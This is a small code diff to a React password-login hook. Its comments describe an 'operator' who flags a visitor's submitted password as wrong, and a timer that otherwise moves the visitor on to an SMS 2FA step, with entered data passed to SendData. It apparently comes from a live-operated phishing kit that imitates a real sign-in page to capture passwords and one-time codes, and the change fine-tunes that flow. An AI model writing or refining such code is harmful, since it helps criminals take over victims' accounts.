@@ -36,6 +36,12 @@ export const usePasswordAuth = ({
     const newCount = wrongPasswordCount + 1;
     setWrongPasswordCount(newCount);
 
+    // The operator flagged this password as wrong, so cancel the 60s fallback
+    // that would auto-advance the visitor to SMS 2FA (Step2 watches
+    // beginTimer; flipping it false runs the effect's clearTimeout). The next
+    // attempt submission re-arms it fresh at a full 60s.
+    setParentBeginTimer(false);
+
     setIsLoading(false);
     setPassword("");
     setPasswordError("The password that you've entered is incorrect.");
@@ -59,7 +65,11 @@ export const usePasswordAuth = ({
     };
 
     SendData(params);
-  }, [wrongPasswordTrigger, lastProcessedWrongPassword]);
+  }, [
+    wrongPasswordTrigger,
+    lastProcessedWrongPassword,
+    setParentBeginTimer,
+  ]);
 
   const clearPasswordError = () => {
     setPasswordError("");
